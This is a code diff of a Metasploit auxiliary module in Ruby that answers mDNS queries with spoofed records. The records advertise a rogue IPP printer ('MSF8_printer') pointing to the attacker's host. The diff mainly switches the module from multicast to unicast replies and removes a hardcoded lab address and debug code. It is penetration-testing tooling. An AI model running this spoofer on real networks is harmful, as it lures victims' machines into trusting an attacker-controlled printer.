@@ -34,13 +34,6 @@ class MetasploitModule < Msf::Auxiliary
     ))
   end
 
-  def start_service
-    super
-
-    membership = IPAddr.new(MULTICAST_ADDR).hton + IPAddr.new(bindhost).hton
-    self.service.udp_sock.setsockopt(Socket::IPPROTO_IP, Socket::IP_ADD_MEMBERSHIP, membership)
-  end
-
   #
   # Wrapper for service execution and cleanup
   #
@@ -56,18 +49,18 @@ class MetasploitModule < Msf::Auxiliary
   #
   # Creates Proc to handle incoming requests
   #
-  def on_dispatch_request(cli,data)
+  def on_dispatch_request(cli, data)
     return if data.strip.empty?
 
     req = Packet.encode_drb(data)
 
-    return unless req.answer.empty?
+    return unless req.answer.empty? # don't process responses at all
 
-    peer = "#{cli.peerhost}:#{cli.peerport}"
+    peer = Rex::Socket.to_authority(cli.peerhost, cli.peerport)
     asked = req.question.map(&:qname).map(&:to_s).join(', ')
     vprint_status("Received request for #{asked} from #{peer}")
 
-    printer_name = 'MSF_printer'
+    printer_name = 'MSF8_printer'
 
     req.question.each do |question|
       case question.qname.to_s
@@ -81,7 +74,6 @@ class MetasploitModule < Msf::Auxiliary
         req.add_answer(Dnsruby::RR.create(
           name: "#{printer_name}._ipp._tcp.local",
           type: 'SRV',
-          #klass: 0x8001,
           ttl: 120,
           target: "#{printer_name}.local",
           priority: 0,
@@ -96,26 +88,19 @@ class MetasploitModule < Msf::Auxiliary
             'txtvers=1',
             'qtotal=1',
             'rp=printers/hax',
-            'ty=MSF Printer',
+            'ty=MSF Printer (Unicast)',
             'pdl=application/postscript,application/pdf',
-            'adminurl=http://192.168.159.128:8631',
             'UUID=ff3332a5-a6e3-4ac7-9679-16c322f153a4',
             'printer-type=0x800683'
           ]
 
         })
-        req.add_answer(Dnsruby::RR.create(
-          name: "#{printer_name}._ipp._tcp.local",
-          type: 'NSEC',
-          ttl: 120,
-          next_domain: "#{printer_name}._ipp._tcp.local",
-          types: [Dnsruby::Types.AAAA]
-        ))
+
         req.add_answer(Dnsruby::RR.create(
           name: "#{printer_name}.local",
           type: 'A',
           ttl: 120,
-          address: '192.168.159.128'
+          address: bindhost
         ))
       end
     end
@@ -127,23 +112,14 @@ class MetasploitModule < Msf::Auxiliary
 
     req.header.aa = true
     response_data = Packet.generate_response(req).encode
-    #service.send_response(cli, response_data)
-    #cli.write()
-    cli.srvsock.sendto(response_data, MULTICAST_ADDR, 5353)
-    #sock = Rex::Socket::Udp.create('PeerHost' => '224.0.0.251', 'PeerPort' => 5353, 'LocalHost' => '192.168.159.128', 'LocalPort' => 5353)
-    #sock.write(response_data)
+    service.send_response(cli, response_data)
   end
 
   #
   # Creates Proc to handle outbound responses
   #
-  # def on_send_response(cli, data)
-  #   res = Packet.encode_drb(data)
-  #   peer = "#{cli.peerhost}:#{cli.peerport}"
-  #   asked = res.question.map(&:qname).map(&:to_s).join(', ')
-  #   vprint_status("Sending response for #{asked} to #{peer}")
-  #
-  #   sock = Rex::Socket::Udp.create('PeerHost' => '224.0.0.251', 'PeerPort' => 5353, 'LocalHost' => '192.168.159.128')
-  #   sock.write(data)
-  # end
+  def on_send_response(cli,data)
+    vprint_status("Sending response to #{Rex::Socket.to_authority(cli.peerhost, cli.peerport)}")
+    cli.write(data)
+  end
 end
